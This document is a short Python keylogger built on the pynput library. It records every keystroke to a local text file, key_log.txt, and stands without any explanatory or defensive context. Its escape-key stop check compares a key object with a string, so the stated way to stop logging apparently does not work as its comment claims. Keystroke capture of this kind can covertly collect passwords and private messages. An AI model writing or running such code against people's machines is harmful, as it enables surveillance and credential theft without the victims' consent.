from pynput.keyboard import Listener

def on_press(key):
    try:
        # Log the key and avoid issues with special characters
        with open("key_log.txt", "a") as log_file:
            log_file.write(str(key).replace("'", "") + " ")
    except Exception as e:
        print(f"Error logging key: {e}")

def on_release(key):
    # Stop logging if the Escape key is pressed
    if key == "Key.esc":
        return False

# Start the listener to capture keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()